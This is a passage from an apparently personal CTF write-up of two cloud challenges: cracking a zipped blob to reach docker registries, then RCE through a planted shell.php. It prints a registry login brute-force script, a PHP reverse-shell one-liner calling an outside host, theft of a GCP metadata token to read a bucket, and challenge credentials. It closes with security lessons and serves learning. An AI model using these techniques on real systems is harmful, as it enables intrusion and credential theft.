    Blog writers are weird people. Some of them have artistic pages, some of them are keep it simple.

    And then there are some, like the creator of the blog for this CTF domain, who prefers to knock people of the floor with his meaningless content.

    But is the content truly meaningless?

    Your mission, if you choose to accept it, is to find the flag that the blog creator has hidden somewhere on the Interwebs. Follow the blog to start your mission!

There was a blog subdomain for the CTF, which had its DNS pointing to an S3 bucket. Requesting the index.html page returned a base64 encoded blob of text. Decoding that to a file, then using the ``file`` utility revealed it was a zip archive. It was password protected, but john the ripper was able to discover the password easily using the `rockyou password list <https://www.kaggle.com/wjburns/common-password-list-rockyoutxt>`_.

::

    $ dig blog.cloudvillagectf.co +short
    blog.cloudvillagectf.co.s3.amazonaws.com.
    s3-1-w.amazonaws.com.
    52.217.96.204

    $ curl -vs http://blog.cloudvillagectf.co/index.html -o index.html
    $ cat index.html |base64 -d > index_decoded.zip
    $ unzip index_decoded.zip 
    Archive:  index_decoded.zip
    [index_decoded.zip] cert.pem password: 
    skipping: cert.pem                incorrect password
    skipping: readme.md               incorrect password

    $ zip2john index_decoded.zip > index_decoded_forjohn
    $ john --wordlist=rockyou.txt index_decoded_forjohn
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Press 'q' or Ctrl-C to abort, almost any other key for status
    culprit          (index_decoded.zip)
    1g 0:00:00:00 DONE (2020-08-08 10:33) 9.090g/s 4730Kp/s 4730Kc/s 4730KC/s cupcake143..cueca
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

    $ file cert.pem 
    cert.pem: PEM certificate

    $ cat readme.md 
    Hey Chris,

    I have been bothering about the docker images collection for a very long time. I am tired and now I need some automated collection storage to store the images. I can't do this anymore. So I have 
    found a tool and I am attaching the link for you to access. 

    URL:- https://docker1.cloudvillagectf.co

    Please utilize it and play with it. Don't forget about the steps to access it as we discussed. 

    - L33tHaxx0r

The PEM cert was an SSL certificate for docker.cloudvillagectf.co. Both docker. and docker1. subdomains were docker image registries hosted behind an AWS ELB.

::

    $ dig docker1.cloudvillagectf.co +short
    ctf-registry-28240095.us-east-2.elb.amazonaws.com.
    $ dig docker.cloudvillagectf.co +short
    ctf-registry-28240095.us-east-2.elb.amazonaws.com.

    $ openssl x509 -in cert.pem -text -noout |grep Subject
            Subject: CN=docker.cloudvillagectf.co
            Subject Public Key Info:
                X509v3 Subject Key Identifier: 
                X509v3 Subject Alternative Name: 

The registry at the docker1. subdomain did not require authentication. The docker client would not work with that registry, though, because the SSL cert didn't match the actual domain name. The REST APIs still worked using curl and ignoring SSL cert errors. Using the REST APIs, it was possible to list images and tags, as well as download the layers. Inside one of the layers was a message about VHOST, and some other random words.

::

    $ curl -vsk https://docker1.cloudvillagectf.co/v2/_catalog
    {"repositories":["culprit-image"]}

    $ curl -vsk https://docker1.cloudvillagectf.co/v2/culprit-image/tags/list
    {"name":"culprit-image","tags":["latest"]}

    $ curl -vsk https://docker1.cloudvillagectf.co/v2/culprit-image/manifests/latest -o manifests.json
    ...
            "blobSum": "sha256:cbc6088e8776fa0301d4ef4ed56276202ab283999670a73f59d6790d531b3afd"
        },                   
        {                                                                     
            "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
        },      
        {                   
            "blobSum": "sha256:df20fa9351a15782c64e6dddb2d4a6f50bf6d3688060a34c4014b0d9a752eb4c"
    ...

    $ tar xf sha256\:cbc6088e8776fa0301d4ef4ed56276202ab283999670a73f59d6790d531b3afd.tar.gz 

    $ tree .
    .
    |-- home
    |   `-- haxxor
    |       `-- haxxor-memo.txt
    |-- root
    `-- sha256:cbc6088e8776fa0301d4ef4ed56276202ab283999670a73f59d6790d531b3afd.tar.gz

    3 directories, 2 files

    $ cat home/haxxor/haxxor-memo.txt
    Hi culprit, I am a naive hacker. I should have been punished for even being here! Now you know me so contact me and help me out. - #ashT@gsuper  ..... P.S. The place you are looking for is a VHOST

    $ file home/haxxor/.wh..wh..opq
    home/haxxor/.wh..wh..opq: empty


I made the guess that these leetspeak words were probably a password or username for the docker. subdomain registry. I wrote a quick script to brute force the docker.cloudvillagectf.co registry using the random words that had appeared in the text files for this challenge so far.
 
 .. code-block:: python
    
    import click
    import itertools
    import subprocess


    @click.command()
    def cli():
        possible_users_and_passwords = [
            'haxxor',
            '#ashT@gsuper',
            'culprit',
            '.wh..wh..opq',
            'Chris',
            'L33tHaxx0r',
        ]

        perms = list(itertools.permutations(possible_users_and_passwords, 2))
        for u, p in perms:
            if _is_docker_login(u, p):
                break
        print(f'None worked :-(')


    def _is_docker_login(user: str, password: str):
        cmd = [
            'docker',
            'login',
            'docker.cloudvillagectf.co',
            '-u', user,
            '-p', password
        ]
        try:
            result = subprocess.check_call(cmd)
        except subprocess.CalledProcessError as ex:
            return False
        print(f'SUCCESS: {" ".join(cmd)}')
        return True


    if __name__ == '__main__':
        cli()

Running that script revealed the credentials, which can be used as http basic auth on this registry. Then I was able to repeat the above requests to list images, tags, and download layers. Inside one of the layers was a flag.txt file. This was a little confusing, because the flag did not take the prescribed format (and was base64 decode-able).

::

    $ python exploit_docker_login.py
    Login Succeeded
    SUCCESS: docker login docker.cloudvillagectf.co -u culprit -p #ashT@gsuper

    $ curl -vsk -u'culprit:#ashT@gsuper' https://docker.cloudvillagectf.co/v2/_catalog
    {"repositories":["flag-image"]}

    $ curl -vsk -u'culprit:#ashT@gsuper' https://docker.cloudvillagectf.co/v2/flag-image/tags/list
    {"name":"flag-image","tags":["latest"]}

    $ curl -vsk -u'culprit:#ashT@gsuper' https://docker.cloudvillagectf.co/v2/flag-image/manifests/latest
    ...
            "blobSum": "sha256:f8dced26be77c25156a19c1632769595e5a8b4bcaf434c5a95c2151a0565cd85"
        },
        {
            "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
        },
        {
            "blobSum": "sha256:4e643cc37772c094642f3168c56d1fcbcc9a07ecf72dbb5afdc35baf57e8bc29"
        },
        {
            "blobSum": "sha256:2821b8e766f41f4f148dc2d378c41d60f3d2cbe6f03b2585dd5653c3873740ef"
        },
        {
            "blobSum": "sha256:97058a342707e39028c2597a4306fd3b1a2ebaf5423f8e514428c73fa508960c"
        },
        {
            "blobSum": "sha256:692c352adcf2821d6988021248da6b276cb738808f69dcc7bbb74a9c952146f7"
    ...

    # download the layers

    $ tar xf sha256\:f8dced26be77c25156a19c1632769595e5a8b4bcaf434c5a95c2151a0565cd85.tar.gz 

    $ tree 
    .
    |-- home
    |   `-- culprit
    |       `-- flag.txt
    |-- root
    `-- sha256:f8dced26be77c25156a19c1632769595e5a8b4bcaf434c5a95c2151a0565cd85.tar.gz

    3 directories, 2 files

    $ cat home/culprit/flag.txt 
    NDliMzVkMjhmNjk1YTI3N2MwNjNhYmFlZWVlNGQ2MDE=

The flag was: ``FLAG-{NDliMzVkMjhmNjk1YTI3N2MwNjNhYmFlZWVlNGQ2MDE=}``

Lessons
~~~~~~~
* Make sure there is auth *and* valid SSL configured on docker registries.
* And, zip file encryption is not secure.

Just out of reach! (800 points)
-------------------------------

    Dave considers himself to be a cloud expert, but more often than not, misses the subtleties of web and cloud security. Take the latest web app that he has built. It offers functionality to view images (pretty lowkey I must say), but has all the necessary precautions to prevent users from abusing the application.

    Can you teach Dave a lesson by hacking into the app and extracting the flag from one of the resources that he uses?

    You can start here - http://imageapp.cloudvillagectf.co

There were some interesting misdirections on this one. For example, there was a robots.txt that had /admin/ disallowed. The user-agent in that robots.txt file didn't actually match common user agents, though, and there wasn't a /admin/ directory or route that I found.

Eventually I discovered there were several development/build/config files that could be downloaded. The composer.json file revealed that phpdotenv was being used. The .env file—commonly used to pass sensitive configuration to php services—could be downloaded, and had a SECRET variable in it. The /downloads/ directory also had a suspicious file called shell.php... That in combination with the server version being Apache 2.4.29, which has a `remote code execution vulnerability <https://nvd.nist.gov/vuln/detail/CVE-2019-0211>`_ with a `known exploit <https://www.tenable.com/blog/cve-2019-0211-proof-of-concept-for-apache-root-privilege-escalation-vulnerability-published>`_, made me think that shell.php was exploitable.

::

    $ python ../dirsearch/dirsearch.py -e html -u http://imageapp.cloudvillagectf.co/
    200   178B   http://imageapp.cloudvillagectf.co:80/composer.json
    200    17KB  http://imageapp.cloudvillagectf.co:80/composer.lock
    301   340B   http://imageapp.cloudvillagectf.co:80/css
    301   346B   http://imageapp.cloudvillagectf.co:80/downloads
    301   342B   http://imageapp.cloudvillagectf.co:80/fonts
    302     0B   http://imageapp.cloudvillagectf.co:80/home.php
    301   343B   http://imageapp.cloudvillagectf.co:80/images
    200     4KB  http://imageapp.cloudvillagectf.co:80/index.php
    200     4KB  http://imageapp.cloudvillagectf.co:80/index.php/login/
    301   339B   http://imageapp.cloudvillagectf.co:80/js
    200    32B   http://imageapp.cloudvillagectf.co:80/robots.txt
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/autoload.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/autoload_classmap.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/autoload_files.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/autoload_namespaces.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/autoload_psr4.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/ClassLoader.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/autoload_static.php
    200     0B   http://imageapp.cloudvillagectf.co:80/vendor/composer/autoload_real.php
    200     3KB  http://imageapp.cloudvillagectf.co:80/vendor/composer/LICENSE
    200    15KB  http://imageapp.cloudvillagectf.co:80/vendor/composer/installed.json

    $ curl -vs 'http://imageapp.cloudvillagectf.co:80/composer.json'
    ...
    {
        "require": {
            "vlucas/phpdotenv": "^2.4",
            "nesbot/carbon": "^2.36"
        },
        "autoload": {
            "psr-4": {
                "Src\\": "src/"
            }
        }
    }

    $ curl -vs 'http://imageapp.cloudvillagectf.co/.env'
    ...
    SECRET=vjht123jltccf

    # There are some other interesting finds in /downloads/
    $ python ../dirsearch/dirsearch.py -e html -u http://imageapp.cloudvillagectf.co/downloads/
    ...
    [18:50:46] 200 -    0B  - /downloads/shell.php
    ...

shell.php did allow for RCE, and I was able to get the source for index.php and all the files it used. That revealed the JWT creation and validation code, which ended up not being needed (though JWTs could be forged with the secret). There was a standard user with name dave and password dave. There was an admin user with more interesting creds. The admin user, when signed in was shown a text field that accepted a url and would download the file to the /downloads/ directory.

::

    $ http://imageapp.cloudvillagectf.co/downloads/shell.php?cmd=echo+123
    returns 123

    $ curl -vs 'http://imageapp.cloudvillagectf.co/downloads/shell.php?cmd=cat+../index.php' -o
    index.php
    ...
            if ($pass==="dave"){
            $_SESSION["user"]=$user; 
            $role="user";
            $jwt=generate_jwt($user,$role);

            header("Location: ./home.php");
            setcookie("authtoken",$jwt);

    }elseif($user==="mockingbird"){
        if ($pass==="MockingBird12@"){
            $_SESSION["user"]=$user;
            $role="admin";
            $jwt=generate_jwt($user,$role);

            header("Location: ./home.php");
            setcookie("authtoken",$jwt);
    ...

I got to this challenge later after several other teams had solved it. By that time, continuing to use the shell.php program, I could see that there were tons of `reverse shells <https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/>`_. I setup my own using the php one liner from the `reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_, and then I was able to peruse the system.

::

    # on my host (it has public IP 34.1.2.3, and allows inbound TCP connections to port 29617):
    $ nc -l 29617

    # on the system, we need to run:
    $ php -r '$sock=fsockopen("34.1.2.3",29617);exec("/bin/sh -i <&3 >&3 2>&3");'


It turned out to be a GCP instance. I didn't find the flag on the file sytem. Then I turned my attention to the metadata API. I knew this is a common exploit on AWS instance, and assumed there would be something similar on GCP instance. Sure enough there is a way to get a GCP token from the metadata API, and then I was able to use that to list storage buckets, the objects in the one that was accessible, and ultimately read the object that had the flag in it.

::

    $ find . -type f -exec grep -l 'FLAG-{' {} \;
    # sad panda... 

    $ curl -s 169.254.169.254/0.1/meta-data/zone ; echo
    projects/1015935179454/zones/us-central1-a

    $ curl -s -H "Metadata-Flavor: Google" 169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
    {"access_token":"ya29.c.Kn_XB5wYJr1CRQQ7-bRx-YJHqHwmDQriuIsAi6mljYJorkw_xSkr2PuRcu3ZNhsbk3sGMMP8SkqVo3HKKHmJxMpOKae7Gh8Z_Da0jdFQjY-<redacted>","expires_in":2409,"token_type":"Bearer"}

    $ export TOKEN='ya29.c.Kn_XB5wYJr1CRQQ7-bRx-YJHqHwmDQriuIsAi6mljYJorkw_xSkr2PuRcu3ZNhsbk3sGMMP8SkqVo3HKKHmJxMpOKae7Gh8Z_Da0jdFQjY-<redacted>'

    $ curl -s -H "Authorization: Bearer ${TOKEN}" https://storage.googleapis.com/storage/v1/b?project=1015935179454
    {
        "kind": "storage#buckets",
        "items": [
            {
            "kind": "storage#bucket",
            "selfLink": "https://www.googleapis.com/storage/v1/b/secretstorage",
            "id": "secretstorage",
            "name": "secretstorage",
            "projectNumber": "1015935179454",
            "metageneration": "1",
            "location": "US",
            "storageClass": "STANDARD",
            "etag": "CAE=",
            "defaultEventBasedHold": false,
            "timeCreated": "2020-08-02T12:33:10.078Z",
            "updated": "2020-08-02T12:33:10.078Z",
            "iamConfiguration": {
                "bucketPolicyOnly": {
                "enabled": false
                },
                "uniformBucketLevelAccess": {
                "enabled": false
                }
            },
            "locationType": "multi-region"
            }
        ]
    }

    $ curl -s -H "Authorization: Bearer ${TOKEN}"  https://storage.googleapis.com/storage/v1/b/secretstorage/o
    {
    "kind": "storage#objects",
    "items": [
        {
        "kind": "storage#object",
        "id": "secretstorage/flag.txt/1596371607035421",
        "selfLink": "https://www.googleapis.com/storage/v1/b/secretstorage/o/flag.txt",
        "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/secretstorage/o/flag.txt?generation=1596371607035421&alt=media",
        "name": "flag.txt",
        "bucket": "secretstorage",
        "generation": "1596371607035421",
        "metageneration": "1",
        "contentType": "text/plain",
        "storageClass": "STANDARD",
        "size": "39",
        "md5Hash": "JCfY6fBZsGmfX9m/OmnW7g==",
        "crc32c": "pYfXvg==",
        "etag": "CJ28xNTD/OoCEAE=",
        "timeCreated": "2020-08-02T12:33:27.035Z",
        "updated": "2020-08-02T12:33:27.035Z",
        "timeStorageClassUpdated": "2020-08-02T12:33:27.035Z"
        }
    ]
    }

    $ curl -s -H "Authorization: Bearer ${TOKEN}"  https://storage.googleapis.com/storage/v1/b/secretstorage/o/flag.txt
    {
    "kind": "storage#object",
    "id": "secretstorage/flag.txt/1596371607035421",
    "selfLink": "https://www.googleapis.com/storage/v1/b/secretstorage/o/flag.txt",
    "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/secretstorage/o/flag.txt?generation=1596371607035421&alt=media",
    "name": "flag.txt",
    "bucket": "secretstorage",
    "generation": "1596371607035421",
    "metageneration": "1",
    "contentType": "text/plain",
    "storageClass": "STANDARD",
    "size": "39",
    "md5Hash": "JCfY6fBZsGmfX9m/OmnW7g==",
    "crc32c": "pYfXvg==",
    "etag": "CJ28xNTD/OoCEAE=",
    "timeCreated": "2020-08-02T12:33:27.035Z",
    "updated": "2020-08-02T12:33:27.035Z",
    "timeStorageClassUpdated": "2020-08-02T12:33:27.035Z"
    }

    $ curl -s -H "Authorization: Bearer ${TOKEN}"  'https://storage.googleapis.com/download/storage/v1/b/secretstorage/o/flag.txt?generation=1596371607035421&alt=media'
    FLAG-{cU3XThbIgqt7heW1fV1C6LyhyrWiJJsr}

Lessons
~~~~~~~
* Don't deploy development files to production hosts.
* Don't allow users to download configuration files, especially if they contain secrets. Use a secrets manager, or at least make the files unreadable/unfetchable by HTTP requests.
* The JWT signing secret was not very strong for this service. That was the least of its issues in this particular case, however it should be a strong secret values so it cannot be cracked easily.
* This application also rolled its own JWT signing and validation... that's not advisable. In this case, it avoided common JWT issues like alg=none, but there might have been more subtle issues.
* Definitely defintely defintely don't download arbitrary urls that users can specify, and then execute those files or allow users to execute them. That's how all kinds of horrible things can happen. I was amazed at the number of reverse shells and other random software that had been downloaded. I was also impressed that nobody had setup a crypo miner on that instance...
